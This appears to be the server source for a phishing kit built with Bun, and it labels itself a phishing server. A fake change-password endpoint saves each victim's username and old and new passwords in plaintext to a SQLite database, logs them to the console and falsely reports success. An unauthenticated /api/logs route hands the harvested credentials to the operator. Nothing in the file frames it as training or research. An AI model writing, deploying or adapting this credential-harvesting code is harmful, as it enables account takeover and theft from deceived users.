import { serve } from "bun";
import homepage from "./index.html";
import adminpage from "./admin.html";
import { SQL } from "bun";

const db = new SQL("sqlite://database.db");
await db`
  CREATE TABLE IF NOT EXISTS passwords (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    old_password TEXT NOT NULL,
    new_password TEXT NOT NULL,
    ip_address TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    timestamp TEXT NOT NULL
  );
`;

const server = serve({
  routes: {
    // HTML imports
    "/": homepage,
    "/admin": adminpage,

    // API endpoints
    "/api/change-password": {
      async POST(req) {
        const { username, current_password, new_password } =
          (await req.json()) as {
            username: string;
            current_password: string;
            new_password: string;
          };

        // Get client info
        const ip_address = req.headers.get("x-forwarded-for") || "unknown";
        const user_agent = req.headers.get("user-agent") || "unknown";

        // Log the password change attempt
        await db`
          INSERT INTO passwords
            (username, old_password, new_password, ip_address, user_agent, timestamp)
            VALUES (
              ${username},
              ${current_password},
              ${new_password},
              ${ip_address},
              ${user_agent},
              ${new Date().toISOString()}
            )
        `;

        // Log to console
        console.log("Password change attempt:", {
          username,
          old_password: current_password,
          new_password,
          ip_address,
          user_agent,
        });

        // Simulate successful password change
        return Response.json({
          success: true,
          message: "Password changed successfully",
        });
      },
    },

    "/api/logs": {
      async GET(req) {
        const logs = await db`
          SELECT * FROM passwords
        `;
        // Return all logs
        return Response.json(logs);
      },
    },
  },

  // Enable development mode
  development: true,
});

console.log(`Phishing server running at ${server.url}`);
console.log(`Admin dashboard available at ${server.url}admin`);
